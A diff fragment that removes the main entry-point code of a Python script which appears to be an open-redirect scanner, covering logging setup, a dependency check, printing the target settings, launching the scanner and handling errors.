-        logging.getLogger().setLevel(logging.DEBUG)
-    
-    # Check dependencies
-    if not check_dependencies():
-        print("\n❌ [SYSTEM-ERROR] Missing critical dependencies")
-        print("Install with: pip3 install aiohttp beautifulsoup4 selenium")
-        return
-    
-    print(f"\n🎯 [TARGET] {args.target}")
-    print(f"⚙️  [CONFIG] Depth: {args.depth} | Max Pages: {args.max_pages}")
-    
-    # Launch ultimate scanner
-    scanner = UltimateRedirectHunter(args.target, args.depth, args.max_pages)
-    await scanner.run_ultimate_scan()
-
-
-if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n🛑 [ABORTED] Mission interrupted by operator")
-    except Exception as e:
-        print(f"💥 [CRITICAL-ERROR] {e}")
-        logging.error(f"Fatal system error: {e}", exc_info=True)
